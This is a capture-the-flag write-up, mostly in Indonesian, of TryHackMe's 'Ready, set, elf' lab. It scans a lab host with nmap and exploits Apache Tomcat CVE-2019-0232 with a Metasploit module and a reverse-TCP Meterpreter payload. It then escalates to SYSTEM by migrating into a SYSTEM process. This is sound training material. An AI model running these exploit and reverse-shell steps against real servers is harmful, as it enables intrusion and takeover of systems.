# Day 12 | Ready, set, elf

`TryHackMe` `Networking` `Public Exploits` `Metasploit` `Privilege Escalation` 

---

## Learning Outcomes

- Mengetahui cara melakukan *information gathering* dan *enumeration*
- Mencari kerentanan yang terpublikasi (CVE)
- Menggunakan metasploit pada post eksploitasi

## Story 

> Christmas is fast approaching, yet, all remain silent at The Best Festival Company (TBFC). What gives?! The cheek of those elves - slacking at the festive period! Santa has no time for slackers in his workshop. After all, the sleigh won't fill itself, nor will the good and naughty lists be sorted. Santa has tasked you, Elf McEager, with whacking those elves back in line.

## Summary

tl;dr 

> tanpa privesc
- Gunakan metasploit dengan module exploit/windows/http/tomcat_cgi_cmdlineargs
- Sesuaikan opsi required-nya, dimana TARGETURI-nya adalah /cgi-bin/elfwhacker.bat
- Run exploit!


## Write-up

Write up untuk task kali ini selain mengikuti alur dari challenge dan pertanyaan dibawah, terdapat juga bonus challenge untuk melakukan privilege escalation.

Berikut penyelesaiannya.

### Challenge

> To solve Elf McSkidy's problem with the elves slacking in the workshop, he has created the CGI script: **elfwhacker.bat**
>
> Deploy the instance attached to this task, use your NMAP skills from "Day 8 - What's Under the Christmas Tree?  to find out what port the webserver (MACHINE_IP) is running on...Visit the application and discover the installation version, weaponise this information by searching knowledgebases for exploits and Meterpreter payloads possible and whack those elves!.
>
>*Bonus: There are at least two ways of escalating your privileges after you gain entry. Find these out and pivot at your leisure! (please note that this is optional for the day should you fancy the challenge...)*

### Q1: What is the version number of the web server?

Untuk menjawab pertanyaan ini, hal pertama yang dilakukan adalah melakukan pemindaian port pada mesin yang di deploy, namun, hasil pemindaian berikut gagal.

```
nmap 10.10.230.214
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-12 20:12 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.76 seconds
```

Mesin yang dideploy melakukan drop paket icmp atau ping. Hal diatas umumnya sering terjadi pada mesin yang menggunakan Windows.

Berdasarkan rekomendasi nmap, kita dapat mencoba menambahkan opsi `-Pn`. 

```
nmap -sC -sV -Pn --min-rate 10000 10.10.230.214
```

Dan pemindaian berhasil, berikut outputnya.

```
PORT     STATE SERVICE        VERSION
3389/tcp open  ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: TBFC-WEB-01
|   NetBIOS_Domain_Name: TBFC-WEB-01
|   NetBIOS_Computer_Name: TBFC-WEB-01
|   DNS_Domain_Name: tbfc-web-01
|   DNS_Computer_Name: tbfc-web-01
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-13T01:05:20+00:00
| ssl-cert: Subject: commonName=tbfc-web-01
| Issuer: commonName=tbfc-web-01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-11-27T01:29:04
| Not valid after:  2021-05-29T01:29:04
| MD5:   00ab 1b83 e8e5 f516 f148 d602 2dea 18f4
|_SHA-1: bd1d 6535 5d3c 80a3 8a5f 98dd 8f98 44ee 9320 509e
|_ssl-date: 2020-12-13T01:05:24+00:00; +3s from scanner time.
8009/tcp open  ajp13          Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http           Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.17

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
```

### Q2: What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

Untuk menjawab pertanyaan ini, saya menggunakan hint yang ada :)

![191c18611d7eb334dc8edee9c2bf7ae9.png](./_resources/f7cabe48e8b44a878177fbd58008960b.png)

Hasil pencarian mengarah ke `CVE-2019-0232`

![a142fc38f35c3de1fc2c4556d8dc3072.png](./_resources/89d2233f7ed242aa8f00de4d1092182c.png)

Sumber : https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/version_id-209957/Apache-Tomcat-9.0.0.html


### Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

Metasploit memiliki module exploit dari CVE tersebut

![72a020a98e6377a99af6382879c4fa38.png](./_resources/b593dde6795f4e62a6e6fb1800819967.png)

Berikut opsi yang ada pada module tersebut.

![baaa42f715ca862b71d028c5cf5b2e59.png](./_resources/b668a888f5a74fc3a09f61d2e679431f.png)

Opsi yang bersifat required dan belum terpenuhi adalah
TARGETURI, kita dapat mencoba teknik fuzzing karena nama scriptnya sudah diketahui, yaitu **`elfwhacker.bat`**

![b5e8ba29d1137179556cfef34787b96f.png](./_resources/003d7cb6e9ea46fbbafb3bb2f4521e60.png)

Seluruh opsinya required sudah terpenuhi

![edc434b747f56418fe056fdace55e117.png](./_resources/5a557297e41940a69e6445b36dd8ddb7.png)

Lalu gunakan payload meterpreter x64
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
Berikut hasil eksploitasi.

![c76301ec9bbcb4bdc940a48dbc6d6090.png](./_resources/49f4b36bf2c74d7897e76233f11a8415.png)

### Q3: What are the contents of flag1.txt

Gunakan perintah `type` untuk membaca konten file dari flag1.txt
![75bef2a0cb69818bacd73fc80b188ecb.png](./_resources/024bf2ab060349878b37bb42da61dab7.png)


### Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

> Mencoba bonus challenge

Metasploit memiliki post exploitation modules, salah satunya adalah local_exploit_suggester

![376fb3c4903223efcd69fa2543a1bf44.png](./_resources/510e00e709e64743818e22d06bad18f3.png)

Arsitektur mesin target adalah windows x64

![b524519c9e638cd5ec1e94936e58cb71.png](./_resources/a9f9261d676d4ac5b4ecbc4af63d38b8.png)
 
Sebelum menggunakan dua exploit tersebut, terdapat suatu proses bernama `Elfwhacker.exe`, proses ini berjalan sebagai NT Authority\System

![0b94a6dd1f3c50b8b04f48508a7bca7f.png](./_resources/14fa762d449c49e9b9e735b169c4b7c2.png)

Proses migrasi ke pid tersebut berhasil.

![d927e2ce7693e38c31092d45ec61c9d8.png](./_resources/2d22272be6c446dda4971854fbb78896.png)

Done

![fbf3a3711f57a42ceb851423ddf971f7.png](./_resources/3d3d4b4a43bd4ceca7317a918c3c686c.png)